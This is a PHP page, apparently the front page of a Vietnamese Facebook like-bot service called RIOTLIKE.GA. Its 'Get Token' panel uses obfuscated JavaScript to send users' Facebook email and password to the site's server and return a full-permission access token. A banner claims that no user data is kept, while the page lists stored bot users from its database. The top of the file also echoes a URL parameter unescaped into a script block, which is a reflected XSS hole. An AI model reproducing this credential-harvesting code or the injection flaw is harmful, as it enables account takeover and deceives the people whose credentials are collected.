<?php
include 'system/head.php';
include 'config.php';

if(isset($_GET['i'])){
echo '
<script>
alert("' . $_GET['i'] . '")
</script>';
}
if($act=='reset') { session_destroy(); }
if(isset($_SESSION['id'])) {
include 'menu.php';

}else{
form();
}


            
function form(){
$js = '';
$babi = mysql_query ("SELECT name, COUNT(name) FROM bot");
$rober = mysql_fetch_array($babi);
$rec=$rober['COUNT(name)'];
$babi2 = mysql_query ("SELECT name, COUNT(name) FROM botcmt");
$rober2 = mysql_fetch_array($babi2);
$rec2=$rober2['COUNT(name)'];
$babi3 = mysql_query ("SELECT name, COUNT(name) FROM botlike");
$rober3 = mysql_fetch_array($babi3);
$rec3=$rober3['COUNT(name)'];
$babi4 = mysql_query ("SELECT name, COUNT(name) FROM exlike");
$rober4 = mysql_fetch_array($babi4);
$rec4=$rober4['COUNT(name)'];
$babi5 = mysql_query ("SELECT name, COUNT(name) FROM camxuc");
$rober5 = mysql_fetch_array($babi5);
$rec5=$rober5['COUNT(name)'];
$babi6 = mysql_query ("SELECT name, COUNT(name) FROM exlove");
$rober6 = mysql_fetch_array($babi6);
$rec6=$rober6['COUNT(name)'];

print '<div class="wrapper wrapper-content animated fadeInRight">
                    <div class="row">

            <div class="col-lg-3">
                <div class="widget style1 red-bg">
                        <div class="row">
                            <div class="col-xs-4 text-center">
                                <i class="fa fa-trophy fa-5x"></i>
                            </div>
                            <div class="col-xs-8 text-right">
                                <span>Tổng Người Dùng</span>
                                <h2 class="font-bold">'.$rec.'</h2>
                            </div>
                        </div>
                </div>
            </div>
            <div class="col-lg-3">
                <div class="widget style1 navy-bg">
                    <div class="row">
                        <div class="col-xs-4">
                            <i class="fa fa-thumbs-up fa-5x"></i>
                        </div>
                        <div class="col-xs-8 text-right">
                            <span>Người Dùng Bot Like</span>
                            <h2 class="font-bold">'.$rec3.'</h2>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-lg-3">
                <div class="widget style1 lazur-bg">
                    <div class="row">
                        <div class="col-xs-4">
                            <i class="fa fa-star-half-o fa-5x"></i>
                        </div>
                        <div class="col-xs-8 text-right">
                            <span>Người Dùng Bot Ex</span>
                            <h2 class="font-bold">'.$rec2.'</h2>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-lg-3">
                <div class="widget style1 yellow-bg">
                    <div class="row">
                        <div class="col-xs-4">
                            <i class="fa fa-comment fa-5x"></i>
                        </div>
                        <div class="col-xs-8 text-right">
                            <span>Người Dùng Bot CMT</span>
                            <h2 class="font-bold">'.$rec4.'</h2>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </div>

	
    			    <div class="col-lg-12">
   <div class="ibox float-e-margins">
                    <div class="ibox-title"><b>
                        <i class="fa fa-bullhorn"></i>  BẢN TIN RIOTLIKE.GA</b>
                    </div>
                    <div class="ibox-content" style="display: block;">
                    <div class="panel-body">
                        <div id="carousel-example-generic" class="carousel slide" data-interval="3000" data-ride="carousel">
                            <!-- Wrapper for slides -->
                            <div class="carousel-inner" role="listbox">
                                <div class="item">
                                    <div class="alert alert-success" style="color:#00BCD4;"> ﻿<img src="http://wapkaimage.com/400864/400864147_061a7f0a1d.gif"> <b>CHÀO MỪNG ĐẾN VỚI HỆ THỐNG RIOTLIKE.GA  - HỆ THỐNG HIỆN ĐẠI HÓT NHẤT HIỆN NAY
                                  </b></div>
                                </div>
                                <div class="item active">
                                    <div class="alert alert-info" style="color:#00BCD4;"> 
                                        <img src="http://wapkaimage.com/400864/400864147_061a7f0a1d.gif"><b> HỆ THỐNG KHÔNG LƯU LẠI THÔNG TIN NGƯỜI DÙNG CỦA BẠN - CÁC BẠN NÊN ĐĂNG NHẬP BẰNG TOKEN FULL QUYỀN NHÉ.
                                      </b> </div>
                                    </div>
                                <div class="item">
                                    <div class="alert alert-danger" style="color:#00BCD4;"> 
                                        <img src="http://wapkaimage.com/400864/400864147_061a7f0a1d.gif"><b> RIOTLIKE.GA LÀ WEBSITE TĂNG LIKE. CẢM XÚC. NGƯỜI THEO DÕI. BẠN BÈ. COMMENT.BOT CẢM XÚC. CHIA SẺ FACEBOOK MIỄN PHÍ.
                                    </b></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>   </div>   </div> 
    			<div class="row">
    <div class="row">
<!--Panel Đăng Nhập-->
			<div class="col-lg-12">
<div class="col-lg-7">
                <div class="ibox float-e-margins">
                    <div class="ibox-title">
                        <h5><i class="fa fa-power-off" aria-hidden="true"></i> Đăng Nhập Hệ Thống</h5>
                        <div class="ibox-tools">
                            <a class="collapse-link">
                                <i class="fa fa-chevron-up"></i>
                            </a>
                            <a class="close-link">
                                <i class="fa fa-times"></i>
                            </a>
                        </div>
                    </div>
                    <div class="ibox-content" style="display: block;">
                        <div class="form-group">
<center> <b>*</b><i>Để Sử Dụng Bot Reactions (Cảm Xúc) Bạn Lấy Token Tại Khung Get Token Full Quyền Phía Bên Phải, Xem Hướng Dẫn <a data-toggle="modal" data-target="#huongdan">Tại Đây</a></b></i>.
<div class="panel-body" id="btn-click">
<div class="form-group has-success">
<div class="input-group">

<input type="text" class="form-control" id="access_token" value="" required="" placeholder="Nhập địa chỉ URL sau khi lấy Token tại đây" />
<span class="input-group-btn">
                                                       <button type="submit" class="btn btn-primary" onClick="Login()" data-toggle="tooltip" data-placement="right"> <i class="fa fa-check" aria-hidden="true"></i> Đăng Nhập</button>
                                                        </span>

</div></div>
 <center>
            <div class="col-md-12 col-xs-12">                                            
<div class="form-group">
                                            <div class="col-md-4">
                                                <button type="button" class="btn btn-block btn-rounded btn-outline btn-danger" data-toggle="modal" data-target="#capquyen"><i class="fa fa-cogs"></i> Cấp Quyền</button>
                                            </div>
                                            <div class="col-md-4">
                                                <a class="btn btn-block btn-rounded btn-outline btn-success" href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank"><i class="fa fa-external-link"></i> Lấy Token</a>
                                            </div>
                                            <div class="col-md-4">
                                                <a class="btn btn-block btn-rounded btn-outline btn-warning"  data-toggle="modal" data-target="#huongdan"><i class="fa fa-question"></i> Hướng Dẫn Đăng Nhập  </a>
                                            </div>
                                        </div>
                                                </div>
   </center>



<div class="form-group"> 
                                                <center><font color="green">Administrator &amp; Support:</font>
                                                <a href="https://www.facebook.com/KHIEMDAK.DZ/?fref=ts"><font color="blue"> KHIEMDAIK.DZ </font></a> <br>

                                              <div class="fb-follow" data-href="https://www.facebook.com/KHIEMDAIK.DZ" data-layout="button_count" data-size="small" data-show-faces="true"></div>
<div class="fb-like" data-href="https://www.facebook.com/KHIEMDAIK.DZ" data-layout="button_count" data-action="like" data-size="small" data-show-faces="true" data-share="true"></div>

                                                <br>
                                                <font color="black">Bấm Theo Dõi & Like Và Chia Sẻ Để Ủng Hộ RIOTLIKE.GA Ngày Càng Phát Triển!!
                                                Một Hành Động Nhỏ Nhưng Mang Đầy Ý Nghĩa Với Chúng Tôi Trân Thành Cảm Ơn
                                                </font>
                                                </center>
                                            </div>

</div>
<div class="panel-body" id="btn-load" style="display:none;">
<center><img src="http://vignette2.wikia.nocookie.net/lopa13/images/b/bb/Loading_logofinal_by_zegerdon-d60eb1v.gif/revision/latest?cb=20150403115825&path-prefix=vi"></center>
</div>
</div>
</div>
<script type="text/javascript">
function autoLike()
    {
    $("#btn-click").hide();
    $("#btn-load").show();
    }
</script>      
                    </div>
                </div>
         

 <div class="col-lg-5">
                <div class="ibox float-e-margins">
                    <div class="ibox-title">
                        <h5><i class="fa fa-key" aria-hidden="true"></i> Get Token Full Quyền</h5>
                        <div class="ibox-tools">
                            <a class="collapse-link">
                                <i class="fa fa-chevron-up"></i>
                            </a>
                            <a class="close-link">
                                <i class="fa fa-times"></i>
                            </a>
                        </div>
                    </div>
                    <div class="ibox-content" style="display: block;">
                        <div class="form-group">
<label for="email">* Email hoặc số điện thoại :</label>
<input id="email" placeholder="Nhập Email" class="form-control"/>
</div>
<div class="form-group"><label for="password">* Mật khẩu :</label>
<input id="password" type="password" placeholder="Nhập Mật Khẩu" class="form-control"/>
</div>
<div class="form-group"><label for="app_id">* Chọn Ứng Dụng :</label>
<select id="app_id" class="form-control">
<option value="6628568379">Facebook For Iphone (Token Sài Được Bot Cảm Xúc)</option>
<option value="350685531728">Facebook For Android (Token Sài Bot Ib)</option>
<option value="165907476854626">PAGES MANAGER FOR IOS</option>
</select>
</div>
<div class="form-group text-center">
<button id="submit" class="btn btn-sm btn-primary">Lấy Token</button>
</div>
<div class="form-group text-center" id="load_result" style="display:none">
<label for="result">Access Token của bạn là :</label>
<textarea id="result" onclick="this.focus();this.select()" class="form-control" rows="2"></textarea>

</div>
</div>        
                                       </div>
<script src="//code.jquery.com/jquery.min.js"></script>
<script>
    var _0x6619 = ["click", "#submit", "disabled", "attr", "Anh em vui lòng đợi...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Lấy token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "/TokenLogin/full.php", "post", "ajax", "on"];
    $(document)[_0x6619[20]](_0x6619[0], _0x6619[1], function () {
        $(_0x6619[1])[_0x6619[3]](_0x6619[2], _0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[4]);
        var _0x1ea6x1 = $(_0x6619[7])[_0x6619[6]](),
            _0x1ea6x2 = $(_0x6619[8])[_0x6619[6]](),
            _0x1ea6x3 = $(_0x6619[9])[_0x6619[6]]();
        $[_0x6619[19]]({
            url: _0x6619[17],
            type: _0x6619[18],
            data: {
                email: _0x1ea6x1,
                password: _0x1ea6x2,
                app_id: _0x1ea6x3
            },
            success: function (_0x1ea6x1) {
                $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x1ea6x1)
            }
        })[_0x6619[16]](function () {
            $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x6619[14])
        })
    })
</script>
                                    </div>  </div>             
                    </div>                             
				                    <div class="row">       
<div class="col-md-12">
    
<div class="col-lg-6">
                <div class="ibox float-e-margins">
                    <div class="ibox-title">
                        <h5><i class="fa fa-star" aria-hidden="true"></i> Thống Kê Hệ Thống</h5>
                        <div class="ibox-tools">
                            <a class="collapse-link">
                                <i class="fa fa-chevron-up"></i>
                            </a>
                            <a class="close-link">
                                <i class="fa fa-times"></i>
                            </a>
                        </div>
                    </div>
                    <div class="ibox-content" style="display: block;">
                                <div class="panel-body">
                                   <ul class="list-group border-bottom">
                                     <li class="list-group-item">Tổng Người Dùng<span class="badge">'.$rec.'</span></li>
                                        <li class="list-group-item">Số Lượng Người Dùng Bot Like<span class="badge badge-danger">'.$rec3.'</span></li>
                                        <li class="list-group-item">Số Lượng Người Dùng Bot Comment<span class="badge badge-info">'.$rec2.'</span></li>
                                        <li class="list-group-item">Số Lượng Người Dùng Bot Like Ex<span class="badge badge-info">'.$rec4.'</span></li>
                                        <li class="list-group-item">Số Lượng Người Dùng Bot Reations<span class="badge badge-warning">'.$rec5.'</span></li>
                                        <li class="list-group-item">Số Lượng Người Dùng Bot Ex Love<span class="badge badge-success">'.$rec6.'</span></li>
                                        <li class="list-group-item">IP Của Bạn<span class="badge badge-info">' .$_SERVER[REMOTE_ADDR]. '</span></li>
                                        <li class="list-group-item">Trạng Thái Hệ Thống<span class="badge badge-warning">Tốt</span></li>
                                    </ul>
                                </div>       
                    </div>
                </div>
            </div>';
?>
<div class="col-lg-6">
                <div class="ibox float-e-margins">
                    <div class="ibox-title">
                        <h5><i class="fa fa-space-shuttle" aria-hidden="true"></i> Người Dùng Mới</h5>
                        <div class="ibox-tools">
                            <a class="collapse-link">
                                <i class="fa fa-chevron-up"></i>
                            </a>
                            <a class="close-link">
                                <i class="fa fa-times"></i>
                            </a>
                        </div>
                    </div>
                   <div class="ibox-content" style="display: block;">
                                <div class="panel-body">
                                   <ul class="list-group border-bottom">
                        <table class="table"> 
                                  <tbody>
                                  <?php
                                    $infotv = mysql_query("SELECT * FROM `bot` order by id desc LIMIT 0,8");
                                  while ($getinfo = mysql_fetch_array($infotv)){
        $nametv= $getinfo['name'];
        $idtv= $getinfo['user_id'];
        ?>
                                    <tr>
                                        <td>
<a href="https://facebook.com/<?php echo $idtv; ?>" target="_blank" rel="nofollow"><font color="red"><?php echo $nametv; ?></font></a>
                                        </td>
                                        <td>
<font color="green"><?php echo $idtv; ?></font>
                                        </td>
                                        <td><img src="https://graph.facebook.com/<?php echo $idtv; ?>/picture" class="img-circle" width="20" height="20"></td>
                                        <?php
                                        
if($idtv == 100011302594448 ){
echo '<td>
                                            <span class="badge badge-danger">Admin</span>
                                        </td>                                       
                                    </tr>';
                                    }else{
                                    echo'
                                        <td>
                                            <span class="badge badge-primary">Thành viên</span>
                                        </td>                                       
                                    </tr>';} ?>
                                 
                                                                        
<?php } ?>                                </tbody>
                             </table>      
                        </div>    
                    </div>
                </div>
            </div> </div> </div></div>

			<div class="modal inmodal" id="capquyen" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="modal-dialog modal-lg">
		<div class="modal-content animated bounceIn">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
				<h4 class="modal-title">Cấp Quyền Ứng Dụng</h4>
				<small class="font-bold">
					<p class="text-danger">Lưu Ý: Mục Này Chỉ Dành Cho Tài Khoản Sử Dụng Lần Đâu Tại Website.</p>
				</small>
			</div>
			<div class="modal-body">
				<h3>Bước 1</h3>
				<a class="btn btn-outline btn-primary" href="https://goo.gl/Uqm5An" target="_blank"><i class="fa fa-cogs"></i> Cài Đặt Ứng Dụng Lần Đầu</a>
				<hr>
				<h3>Bước 2</h3>
				<div class="item">
					<img alt="image" class="img-responsive" src="http://i.imgur.com/lmGum7W.jpg">
				</div>
				<div class="item">
					<img alt="image" class="img-responsive" src="http://i.imgur.com/CuDbXfi.jpg">
				</div>
				<div class="item active">
					<img alt="image" class="img-responsive" src="http://i.imgur.com/OaQCqGN.jpg">
				</div>
				<div class="item active">
					<img alt="image" class="img-responsive" src="http://i.imgur.com/a4TJQZI.jpg">
				</div>
				<hr>
				<h3>Bước 3</h3>
				<p style="font-size: 17px;">Sau Khi Thực Hiện Xong Các Bước Trên Bạn Trở Lại Website Vào Chọn Mục <a class="btn btn-outline btn-success" href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank"><i class="fa fa-external-link"></i> Lấy Token</a></p>
				<hr>
				<h3>Bước 4</h3>
				<div class="item">
					<img alt="image" class="img-responsive" src="http://i.imgur.com/j8k0mEs.png">
				</div>
				<p style="font-size: 17px;">Phần URL Có Mũi Tên Chỉ Bên Trên Chính Là Mã Token Của Bạn! </p>
				<hr>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-outline btn-danger" data-dismiss="modal">Đóng</button>
			</div>
		</div>
	</div>
</div>
           
         <div class="modal inmodal" id="huongdan" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="modal-dialog modal-lg">
		<div class="modal-content animated bounceIn">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
				<h4 class="modal-title">Hướng Dẫn Đăng Nhập Tại RIOTLIKE.GA</h4>
				<small class="font-bold">
					<p class="text-danger">Lưu Ý: Hướng Dẫn Dành Cho Các Bạn Lần Đầu Sử Dụng Tại RIOTLIKE.GA</p>
				</small>
			</div>
			<div class="modal-body"><center>
<div class="embed-responsive embed-responsive-16by9">
				<h3>Hướng Dẫn Bằng ViDeo</h3>
				<iframe width="560" height="315" src="https://www.youtube.com/embed/yJ2pugrj-pg" frameborder="0" allowfullscreen></iframe>
				<hr>
			</div></div></center>
			<div class="modal-footer">
				<button type="button" class="btn btn-outline btn-danger" data-dismiss="modal">Đã Hiểu</button>
			</div>
		</div>
	</div>
</div>
       
	

<?php

}

include 'system/foot.php';



function getData($dir,$params=null){
$param = array(
'access_token' => getToken(),
);
if($params){ $arrayParams=array_merge($params,$param); }else{ $arrayParams =$param; }
$url = getUrl('graph',$dir,$arrayParams);
$result = json_decode(auto($url),true);
if($result[data]){
return $result[data];
}else{
return $result;
}
}
function getUrl($domain,$dir,$uri=null){
if($uri){
foreach($uri as $key =>$value){
$parsing[] = $key . '=' . $value;
}
$parse = '?' . implode('&',$parsing);
}
return 'https://' . $domain . '.facebook.com/' . $dir . $parse;
}

function getToken(){
return $_SESSION['access_token'];
}

function auto($url){
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $url);
$ch = curl_exec($curl);
curl_close($curl);
return $ch;
}
?>


<script>

    $("#access_token").on('paste', function(event) {
        var _this = this;
        setTimeout( function() {
            var text = $(_this).val();
            Login(text);
        }, 100);
    });

function Login(_token){
    autoLike();

        var access_token = $('#access_token').val();
    console.log(access_token);
    $.ajax({

        url: '/login.php',
        type: 'post',
        data: {access_token: _token},
        success: function(data){


            if(data){

                alert(data);
                window.location.reload();

            }else{


                alert('đăng nhập thất bại. access_token đã không đúng hoặc hết hạn');
                $("#btn-click").show();
                $("#btn-load").hide();

            }


        }



    });



}



</script>